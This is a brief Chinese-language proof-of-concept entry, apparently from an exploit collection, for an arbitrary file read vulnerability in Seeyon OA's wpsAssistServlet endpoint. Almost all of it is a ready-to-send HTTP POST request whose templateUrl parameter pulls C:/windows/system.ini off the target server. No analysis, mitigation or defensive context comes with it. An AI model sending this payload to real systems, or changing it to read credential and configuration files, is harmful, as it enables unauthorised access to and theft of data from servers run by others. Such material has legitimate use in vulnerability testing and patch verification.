## 致远OA wpsAssistServlet任意文件读取漏洞

## POC
```
POST /seeyon/wpsAssistServlet HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
Content-Length: 47
Content-Type: application/x-www-form-urlencoded

flag=template&templateUrl=C:/windows/system.ini
```
